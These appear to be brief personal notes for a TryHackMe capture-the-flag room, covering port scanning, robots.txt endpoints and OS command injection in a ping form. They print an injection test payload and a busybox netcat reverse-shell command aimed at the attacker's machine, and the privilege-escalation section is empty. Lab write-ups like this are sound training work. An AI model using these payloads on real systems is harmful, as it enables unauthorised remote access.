# URL
https://tryhackme.com/room/hh-infinitypool-5b3548af
# Concept
* OS command injection
* robots.txt
* network pivoting / local port forwarding
# Method of solve
## Starting Scans
* there are two ports open, `22` and `80`
* on the web app's `robots.txt` file, there are references to two endpoints:
  * `/internal` and `/static`
## Initial Access
* on the `/internal` endpoint there is a ping functionality built into the page:
  * this user field is vulnerable to `OS command injection`
    * this payload will confirm the vulnerability:
    * `192.168.134.186; whoami #`
  * we can use this payload to establish a reverse shell connection to the attacker machine:
  * `busybox nc 192.168.134.186 443 -e /bin/bash`
## Privilege Escalation

